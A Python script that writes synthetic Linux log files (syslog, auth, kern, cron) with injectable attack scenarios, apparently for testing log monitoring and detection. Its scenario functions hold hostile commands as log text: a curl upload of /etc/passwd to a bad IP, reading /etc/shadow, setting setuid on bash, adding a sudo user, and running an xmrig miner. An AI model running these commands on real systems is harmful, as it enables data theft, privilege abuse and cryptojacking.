#!/usr/bin/env python3
"""
Realistic Linux syslog generator — dual format output, split log files.
No syslog daemon required.

Output formats:
  syslog   → RFC 5424: <PRIVAL>1 TIMESTAMP HOSTNAME APP-NAME PROCID MSGID - MSG
  auth.log → BSD:      Mon DD HH:MM:SS HOSTNAME APP-NAME[PID]: MSG
  kern.log → BSD:      Mon DD HH:MM:SS HOSTNAME kernel[0]: MSG
  cron.log → BSD:      Mon DD HH:MM:SS HOSTNAME CRON[PID]: MSG

Output files (default: /var/log/):
    syslog      — everything, RFC 5424 format (for log shippers / Dynatrace)
    auth.log    — SSH, sudo, login events, BSD format
    kern.log    — kernel, UFW, OOM events, BSD format
    cron.log    — cron job events, BSD format

Usage:
    python3 generate_logs.py                          # continuous, writes to /var/log/
    python3 generate_logs.py --logdir ./logs          # write to ./logs/ instead
    python3 generate_logs.py --scenario brute_force   # inject a needle
    python3 generate_logs.py --list-scenarios         # show all available needles
    python3 generate_logs.py --count 500 --interval 0.05 --scenario data_exfil
    python3 generate_logs.py --scenario all --count 2000 --logdir ./logs
"""

import random
import time
import argparse
import signal
import sys
import os
import socket
from datetime import datetime, timezone

# ---------------------------------------------------------------------------
# RFC 5424 facility and severity constants
# ---------------------------------------------------------------------------

# Facilities
FAC_KERN   = 0
FAC_USER   = 1
FAC_MAIL   = 2
FAC_DAEMON = 3
FAC_AUTH   = 4
FAC_SYSLOG = 5
FAC_CRON   = 9

# Severities
SEV_EMERG   = 0
SEV_ALERT   = 1
SEV_CRIT    = 2
SEV_ERR     = 3
SEV_WARNING = 4
SEV_NOTICE  = 5
SEV_INFO    = 6
SEV_DEBUG   = 7

def prival(facility, severity):
    return (facility * 8) + severity

# File routing: which log files does each facility write to?
# auth.log gets auth facility; kern.log gets kern; cron.log gets cron; syslog gets everything
FACILITY_FILES = {
    FAC_KERN:   ["kern", "syslog"],
    FAC_USER:   ["syslog"],
    FAC_DAEMON: ["syslog"],
    FAC_AUTH:   ["auth", "syslog"],
    FAC_SYSLOG: ["syslog"],
    FAC_CRON:   ["cron", "syslog"],
}

FILE_NAMES = {
    "auth":   "auth.log",
    "kern":   "kern.log",
    "cron":   "cron.log",
    "syslog": "syslog",
}

# ---------------------------------------------------------------------------
# Persistent actors
# ---------------------------------------------------------------------------

HOSTNAME      = socket.gethostname() or "localhost"
TRUSTED_USERS = ["ubuntu", "alice", "bob", "deploy", "ci"]
INTERNAL_IPS  = [f"10.0.1.{i}" for i in [10, 20, 21, 50, 100, 105]]
KNOWN_BAD_IPS = ["185.220.101.45", "192.42.116.16", "45.95.147.23",
                 "194.165.16.11", "91.108.4.1"]
EXTERNAL_IPS  = [f"203.0.113.{x}" for x in range(1, 20)] + KNOWN_BAD_IPS
SERVICES      = ["nginx", "postgresql", "redis", "docker",
                 "sshd", "cron", "NetworkManager", "fail2ban",
                 "prometheus-node-exporter"]
COMMANDS      = [
    "/usr/bin/apt update",
    "/bin/systemctl restart nginx",
    "/usr/bin/journalctl -f",
    "/bin/bash /opt/deploy.sh",
    "/usr/bin/python3 /opt/monitor.py",
    "/usr/sbin/logrotate /etc/logrotate.conf",
]

# Stable PIDs for persistent services within a run
SERVICE_PIDS = {svc: random.randint(500, 3000) for svc in SERVICES}
SERVICE_PIDS["sshd"] = random.randint(800, 900)
SERVICE_PIDS["cron"] = random.randint(400, 600)

def spid(service):
    return str(SERVICE_PIDS.get(service, random.randint(1000, 65000)))

def epid():
    return str(random.randint(10000, 65000))

def rand_port():
    return random.randint(32768, 60999)

def rand_mac():
    return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))

def rand_container():
    return "".join(random.choices("abcdef0123456789", k=12))

def rand_internal():
    return random.choice(INTERNAL_IPS)

def rand_external():
    return random.choice([ip for ip in EXTERNAL_IPS if ip not in KNOWN_BAD_IPS])

def rfc5424_timestamp():
    """RFC 5424: 2026-07-28T14:23:01.003Z"""
    now = datetime.now(timezone.utc)
    return now.strftime("%Y-%m-%dT%H:%M:%S.") + f"{now.microsecond // 1000:03d}Z"

def bsd_timestamp():
    """BSD syslog: 'Jul 28 14:23:01' — no year, no timezone, single-space day padding."""
    now = datetime.now()
    # BSD format uses ' 1' not '01' for single-digit days
    day = now.strftime("%e").lstrip(" ").rjust(2)  # right-justified, space-padded
    return now.strftime(f"%b {day} %H:%M:%S")

# ---------------------------------------------------------------------------
# Line format builders
# Each entry is a tuple: (facility, syslog_line, split_line)
# syslog_line  → written to /var/log/syslog      (RFC 5424, with <priority>)
# split_line   → written to auth/kern/cron.log   (BSD format, no <priority>)
# ---------------------------------------------------------------------------

def make_syslog_line(facility, severity, app_name, procid, msg, msgid="-", structured_data="-"):
    """RFC 5424 format for /var/log/syslog"""
    pri = prival(facility, severity)
    return f"<{pri}>1 {rfc5424_timestamp()} {HOSTNAME} {app_name} {procid} {msgid} {structured_data} {msg}"

def make_bsd_line(app_name, procid, msg):
    """BSD format for auth.log / kern.log / cron.log"""
    return f"{bsd_timestamp()} {HOSTNAME} {app_name}[{procid}]: {msg}"

def make_entry(facility, severity, app_name, procid, msg, msgid="-"):
    """Return (facility, syslog_line, bsd_line) tuple."""
    return (
        facility,
        make_syslog_line(facility, severity, app_name, procid, msg, msgid),
        make_bsd_line(app_name, procid, msg),
    )

# Shorthand builders by facility
def auth_line(severity, app, procid, msg, msgid="-"):
    return make_entry(FAC_AUTH, severity, app, procid, msg, msgid)

def kern_line(severity, msg, msgid="-"):
    return make_entry(FAC_KERN, severity, "kernel", "0", msg, msgid)

def cron_line(severity, msg):
    return make_entry(FAC_CRON, severity, "CRON", epid(), msg)

def daemon_line(severity, app, procid, msg):
    return make_entry(FAC_DAEMON, severity, app, procid, msg)

# ---------------------------------------------------------------------------
# Correlated event sequences
# Each returns a list of (facility, rfc5424_line) tuples
# ---------------------------------------------------------------------------

def seq_ssh_success(user=None, ip=None):
    user = user or random.choice(TRUSTED_USERS)
    ip   = ip   or rand_internal()
    port = rand_port()
    sess = random.randint(1, 99)
    pid  = spid("sshd")
    return [
        auth_line(SEV_INFO,   "sshd",           pid, f"Accepted publickey for {user} from {ip} port {port} ssh2: RSA SHA256:xK3mQ9abc"),
        auth_line(SEV_INFO,   "sshd",           pid, f"pam_unix(sshd:session): session opened for user {user} by (uid=0)"),
        auth_line(SEV_INFO,   "systemd-logind", pid, f"New session {sess} of user {user}."),
    ]

def seq_ssh_disconnect(user=None, ip=None):
    user = user or random.choice(TRUSTED_USERS)
    ip   = ip   or rand_internal()
    port = rand_port()
    pid  = spid("sshd")
    return [
        auth_line(SEV_INFO, "sshd", pid, f"Disconnected from user {user} {ip} port {port}"),
        auth_line(SEV_INFO, "sshd", pid, f"pam_unix(sshd:session): session closed for user {user}"),
    ]

def seq_ssh_fail(user=None, ip=None):
    user = user or random.choice(TRUSTED_USERS)
    ip   = ip   or rand_external()
    port = rand_port()
    return [
        auth_line(SEV_WARNING, "sshd", spid("sshd"), f"Failed password for {user} from {ip} port {port} ssh2"),
    ]

def seq_sudo(user=None, cmd=None):
    user = user or random.choice(TRUSTED_USERS)
    cmd  = cmd  or random.choice(COMMANDS)
    pid  = epid()
    return [
        auth_line(SEV_INFO, "sudo", pid, f"{user} : TTY=pts/{random.randint(0,3)} ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}"),
        auth_line(SEV_INFO, "sudo", pid, f"pam_unix(sudo:session): session opened for user root by {user}(uid=0)"),
        auth_line(SEV_INFO, "sudo", pid, f"pam_unix(sudo:session): session closed for user root"),
    ]

def seq_cron():
    cmds = [
        "run-parts /etc/cron.hourly",
        "/usr/sbin/logrotate /etc/logrotate.conf",
        "find /tmp -type f -atime +10 -delete",
        "test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )",
        "/opt/backup.sh >> /var/log/backup.log 2>&1",
        "/usr/local/bin/health-check.sh",
    ]
    return [
        cron_line(SEV_INFO, f"(root) CMD ({random.choice(cmds)})"),
    ]

def seq_service_restart(service=None):
    service = service or random.choice(SERVICES)
    pid     = spid("sshd")  # systemd is always pid 1 but we use spid for realism
    return [
        daemon_line(SEV_INFO, "systemd", "1", f"Stopping {service}.service..."),
        daemon_line(SEV_INFO, "systemd", "1", f"Stopped {service}.service."),
        daemon_line(SEV_INFO, "systemd", "1", f"Starting {service}.service..."),
        daemon_line(SEV_INFO, "systemd", "1", f"Started {service}.service."),
    ]

def seq_service_fail(service=None):
    service = service or random.choice(SERVICES)
    return [
        daemon_line(SEV_ERR,    "systemd", "1", f"{service}.service: Main process exited, code=exited, status=1/FAILURE"),
        daemon_line(SEV_ERR,    "systemd", "1", f"Failed to start {service}.service."),
        daemon_line(SEV_NOTICE, "systemd", "1", f"{service}.service: Scheduled restart job, restart counter is at {random.randint(1,5)}."),
    ]

def seq_ufw_block(ip=None, dpt=None):
    ip  = ip  or rand_external()
    dpt = dpt or random.choice([22, 80, 443, 3306, 5432])
    return [
        kern_line(SEV_WARNING,
                  f"[UFW BLOCK] IN=eth0 OUT= MAC={rand_mac()} SRC={ip} DST={rand_internal()} "
                  f"LEN=60 TOS=0x00 PREC=0x00 TTL=49 ID={random.randint(1000,65000)} DF PROTO=TCP "
                  f"SPT={rand_port()} DPT={dpt} WINDOW=65535 RES=0x00 SYN URGP=0",
                  msgid="UFW_BLOCK"),
    ]

def seq_oom():
    process = random.choice(["python3", "java", "node", "ruby"])
    pid     = epid()
    return [
        kern_line(SEV_WARNING, f"{process} invoked oom-killer: gfp_mask=0x100cca(GFP_HIGHUSER_MOVABLE), order=0"),
        kern_line(SEV_ERR,     f"Out of memory: Kill process {pid} ({process}) score {random.randint(500,999)} or sacrifice child"),
        kern_line(SEV_ERR,     f"Killed process {pid} ({process}) total-vm:{random.randint(500000,2000000)}kB, "
                               f"anon-rss:{random.randint(100000,800000)}kB, file-rss:0kB, shmem-rss:0kB"),
    ]

def seq_disk_warning():
    pct = random.randint(85, 95)
    return [
        daemon_line(SEV_WARNING, "systemd", "1", f"/dev/sda1 is {pct}% full. Consider freeing up disk space."),
        kern_line(SEV_WARNING,   f"EXT4-fs warning (device sda1): ext4_dx_add_entry: Directory index full!"),
    ]

def seq_docker():
    cid = rand_container()
    pid = spid("docker")
    return [
        daemon_line(SEV_INFO, "dockerd", pid, f"Container {cid} started"),
        daemon_line(SEV_INFO, "dockerd", pid, f"Container {cid} health: healthy"),
    ]

def seq_network():
    pid = spid("NetworkManager")
    return [
        daemon_line(SEV_INFO, "NetworkManager", pid, "device (eth0): state change: activated -> deactivating"),
        daemon_line(SEV_INFO, "NetworkManager", pid, "device (eth0): Activation: successful, device activated."),
    ]

# Weighted background noise pool
NORMAL_POOL = []
for fn, weight in [
    (seq_ssh_success,    8),
    (seq_ssh_disconnect, 6),
    (seq_ssh_fail,       4),
    (seq_sudo,           5),
    (seq_cron,          12),
    (seq_service_restart,2),
    (seq_ufw_block,      8),
    (seq_docker,         4),
    (seq_network,        3),
    (seq_oom,            1),
    (seq_disk_warning,   1),
]:
    NORMAL_POOL.extend([fn] * weight)

# ---------------------------------------------------------------------------
# NEEDLE SCENARIOS
# ---------------------------------------------------------------------------

def scenario_brute_force():
    """SSH brute force from a single bad IP, then fail2ban ban.
    Watch: auth.log and syslog"""
    ip   = random.choice(KNOWN_BAD_IPS)
    user = random.choice(TRUSTED_USERS)
    lines = []
    for _ in range(random.randint(18, 35)):
        attempt_user = random.choice(["root", "admin", "ubuntu", "pi", user])
        lines += seq_ssh_fail(user=attempt_user, ip=ip)
    lines += [auth_line(SEV_NOTICE, "fail2ban", spid("fail2ban"), f"[sshd] Ban {ip}")]
    return lines

def scenario_privilege_escalation():
    """Normal login followed by suspicious sudo chain.
    Watch: auth.log and syslog"""
    user = random.choice(TRUSTED_USERS)
    ip   = rand_internal()
    lines = []
    lines += seq_ssh_success(user=user, ip=ip)
    lines += seq_sudo(user=user, cmd="/usr/bin/apt update")
    for cmd in ["/bin/bash", "/usr/bin/passwd root", "/bin/chmod u+s /bin/bash",
                "/usr/sbin/adduser hacker sudo", "cat /etc/shadow"]:
        lines += seq_sudo(user=user, cmd=cmd)
    lines += [auth_line(SEV_CRIT, "sudo", epid(),
                        f"pam_unix(sudo:auth): authentication failure; "
                        f"logname={user} uid=1000 euid=0 tty=/dev/pts/0 ruser={user} rhost= user={user}")]
    return lines

def scenario_data_exfil():
    """Outbound data exfiltration to known bad IP via curl.
    Watch: kern.log, auth.log, syslog"""
    bad_ip = random.choice(KNOWN_BAD_IPS)
    pid    = epid()
    lines  = []
    for _ in range(random.randint(8, 15)):
        lines += [kern_line(SEV_WARNING,
                            f"[UFW ALLOW] IN= OUT=eth0 SRC={rand_internal()} DST={bad_ip} "
                            f"LEN={random.randint(1400,1500)} PROTO=TCP SPT={rand_port()} DPT=443",
                            msgid="UFW_ALLOW")]
    lines += [
        auth_line(SEV_WARNING, "audit", pid,
                  f"type=1400 apparmor=\"ALLOWED\" operation=\"exec\" profile=\"unconfined\" "
                  f"name=\"/usr/bin/curl\" pid={pid} comm=\"curl\""),
        auth_line(SEV_ERR, "sudo", pid,
                  f"deploy : command not allowed ; TTY=pts/1 ; "
                  f"PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl http://{bad_ip}/upload -T /etc/passwd"),
    ]
    return lines

def scenario_service_cascade():
    """PostgreSQL crash cascades to nginx, redis, OOM kill.
    Watch: syslog and kern.log"""
    lines  = seq_service_fail("postgresql")
    lines += [
        daemon_line(SEV_ERR,  "systemd", "1", "nginx.service: Control process exited, code=exited, status=1/FAILURE"),
        daemon_line(SEV_ERR,  "systemd", "1", "redis.service: Start request repeated too quickly."),
        daemon_line(SEV_CRIT, "systemd", "1", "redis.service: Failed with result 'exit-code'."),
        kern_line(SEV_CRIT,   f"Out of memory: Kill process {epid()} (postgres) "
                              f"score {random.randint(700,999)} or sacrifice child"),
    ]
    lines += seq_disk_warning()
    return lines

def scenario_crypto_miner():
    """xmrig cryptominer detected running from /tmp.
    Watch: kern.log, auth.log, syslog"""
    pid    = epid()
    bad_ip = random.choice(KNOWN_BAD_IPS)
    return [
        kern_line(SEV_WARNING,
                  f"[UFW ALLOW] IN= OUT=eth0 SRC={rand_internal()} DST={bad_ip} "
                  f"LEN=1480 PROTO=TCP SPT={rand_port()} DPT=3333",
                  msgid="UFW_ALLOW"),
        kern_line(SEV_WARNING,
                  f"audit: type=1326 arch=c000003e syscall=56 success=yes exit=0 "
                  f"items=0 ppid=1 pid={pid} auid=1000 uid=1000 "
                  f"comm=\"xmrig\" exe=\"/tmp/.x/xmrig\""),
        kern_line(SEV_ERR,
                  f"[UFW ALLOW] IN= OUT=eth0 SRC={rand_internal()} DST={bad_ip} "
                  f"LEN=1480 PROTO=TCP SPT={rand_port()} DPT=4444",
                  msgid="UFW_ALLOW"),
        auth_line(SEV_CRIT, "sudo", pid,
                  f"deploy : command not allowed ; TTY=pts/2 ; "
                  f"PWD=/tmp/.x ; USER=root ; COMMAND=/tmp/.x/xmrig --pool {bad_ip}:3333 --user x --pass x"),
    ]

def scenario_recon():
    """Port scan from a bad IP triggering many UFW blocks.
    Watch: kern.log and syslog"""
    ip    = random.choice(KNOWN_BAD_IPS)
    lines = []
    for port in random.sample(range(1, 10000), random.randint(25, 50)):
        lines += [kern_line(SEV_WARNING,
                            f"[UFW BLOCK] IN=eth0 OUT= MAC={rand_mac()} SRC={ip} "
                            f"DST={rand_internal()} LEN=44 PROTO=TCP SPT={rand_port()} "
                            f"DPT={port} WINDOW=1024 RES=0x00 SYN URGP=0",
                            msgid="UFW_BLOCK")]
    lines += [auth_line(SEV_NOTICE, "fail2ban", spid("fail2ban"), f"[sshd] Ban {ip}")]
    return lines

SCENARIOS = {
    "brute_force":          (scenario_brute_force,         "SSH brute force from bad IP → fail2ban ban",          "auth.log, syslog"),
    "privilege_escalation": (scenario_privilege_escalation,"Suspicious sudo chain post-login",                    "auth.log, syslog"),
    "data_exfil":           (scenario_data_exfil,          "curl exfil of /etc/passwd to bad IP",                 "kern.log, auth.log, syslog"),
    "service_cascade":      (scenario_service_cascade,     "PostgreSQL crash cascades to nginx, redis, OOM",      "syslog, kern.log"),
    "crypto_miner":         (scenario_crypto_miner,        "xmrig detected in /tmp with outbound connections",    "kern.log, auth.log, syslog"),
    "recon":                (scenario_recon,               "Port scan from bad IP triggering UFW blocks",         "kern.log, syslog"),
}

# ---------------------------------------------------------------------------
# Bursty timing
# ---------------------------------------------------------------------------

def next_interval(base):
    r = random.random()
    if r < 0.05:
        return base * random.uniform(5, 15)    # quiet gap
    elif r < 0.20:
        return base * random.uniform(0.01, 0.1) # burst
    else:
        return base * random.uniform(0.5, 2.0)  # normal jitter

# ---------------------------------------------------------------------------
# Write
# ---------------------------------------------------------------------------

# ANSI colors for stdout readability
COLORS = {
    "auth":   "\033[33m",   # yellow
    "kern":   "\033[31m",   # red
    "cron":   "\033[36m",   # cyan
    "syslog": "\033[0m",    # default
}
RESET = "\033[0m"

def write_line(facility, syslog_line, bsd_line, logdir, quiet):
    targets = FACILITY_FILES.get(facility, ["syslog"])
    for target in targets:
        path = os.path.join(logdir, FILE_NAMES[target])
        # syslog gets RFC 5424 (with <priority>); split files get BSD format
        content = syslog_line if target == "syslog" else bsd_line
        with open(path, "a") as f:
            f.write(content + "\n")
    if not quiet:
        primary = targets[0]
        display = syslog_line if primary == "syslog" else bsd_line
        print(f"{COLORS.get(primary, '')}{display}{RESET}")

def emit_sequence(entries, logdir, quiet, interval=0.0):
    count = 0
    for facility, syslog_line, bsd_line in entries:
        write_line(facility, syslog_line, bsd_line, logdir, quiet)
        count += 1
        if interval > 0:
            time.sleep(interval * random.uniform(0.05, 0.3))
    return count

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def handle_exit(sig, frame):
    print("\nStopping log generator.")
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(
        description="RFC 5424 compliant syslog generator with split files and injectable scenarios"
    )
    parser.add_argument("--logdir", type=str, default="/var/log",
                        help="Directory to write log files (default: /var/log)")
    parser.add_argument("--count", type=int, default=None,
                        help="Target log lines then exit (default: unlimited)")
    parser.add_argument("--interval", type=float, default=1.0,
                        help="Base seconds between sequences (default: 1.0)")
    parser.add_argument("--scenario", type=str, default=None,
                        help="Needle to inject: " + ", ".join(list(SCENARIOS.keys()) + ["all"]))
    parser.add_argument("--scenario-after", type=int, default=None,
                        help="Inject scenario after N lines of noise (default: random)")
    parser.add_argument("--list-scenarios", action="store_true",
                        help="List available scenarios and exit")
    parser.add_argument("--quiet", action="store_true",
                        help="Suppress stdout output")
    args = parser.parse_args()

    if args.list_scenarios:
        print("\nAvailable scenarios (needles):\n")
        print(f"  {'NAME':<25} {'VISIBLE IN':<25} DESCRIPTION")
        print(f"  {'-'*24} {'-'*24} {'-'*40}")
        for name, (_, desc, files) in SCENARIOS.items():
            print(f"  {name:<25} {files:<25} {desc}")
        print(f"\n  {'all':<25} {'all files':<25} Inject all scenarios in random order\n")
        sys.exit(0)

    os.makedirs(args.logdir, exist_ok=True)
    print(f"RFC 5424 compliant syslog generator")
    print(f"Writing to: {args.logdir}/{{auth.log, kern.log, cron.log, syslog}}")

    signal.signal(signal.SIGINT, handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)

    inject_at = args.scenario_after
    if args.scenario and inject_at is None:
        if args.count:
            inject_at = random.randint(max(20, args.count // 5), max(30, args.count // 2))
        else:
            inject_at = random.randint(50, 200)

    inject_queue = []
    if args.scenario == "all":
        names = list(SCENARIOS.keys())
        random.shuffle(names)
        inject_queue = [SCENARIOS[n][0] for n in names]
    elif args.scenario:
        if args.scenario not in SCENARIOS:
            print(f"Unknown scenario '{args.scenario}'. Use --list-scenarios.")
            sys.exit(1)
        inject_queue = [SCENARIOS[args.scenario][0]]

    print(f"Generating logs (base interval: {args.interval}s) "
          f"{'(unlimited)' if args.count is None else f'(~{args.count} lines)'}...")
    if inject_queue and args.scenario != "all":
        _, _, files = SCENARIOS[args.scenario]
        print(f"Scenario '{args.scenario}' injects after ~{inject_at} lines. Watch: {files}")
    print("Ctrl+C to stop.\n")

    total_lines  = 0
    all_injected = False

    while args.count is None or total_lines < args.count:

        if inject_queue and not all_injected and total_lines >= inject_at:
            fn = inject_queue.pop(0)
            needle = fn()
            if not args.quiet:
                print(f"\n{'='*60}\n>>> INJECTING: {fn.__name__}\n{'='*60}\n")
            total_lines += emit_sequence(needle, args.logdir, args.quiet,
                                         interval=args.interval * 0.1)
            if not inject_queue:
                all_injected = True
            else:
                inject_at = total_lines + random.randint(30, 100)
            continue

        seq   = random.choice(NORMAL_POOL)
        lines = seq()
        total_lines += emit_sequence(lines, args.logdir, args.quiet,
                                      interval=args.interval * 0.05)
        time.sleep(next_interval(args.interval))

    print(f"\nDone. Emitted ~{total_lines} log lines.")

if __name__ == "__main__":
    main()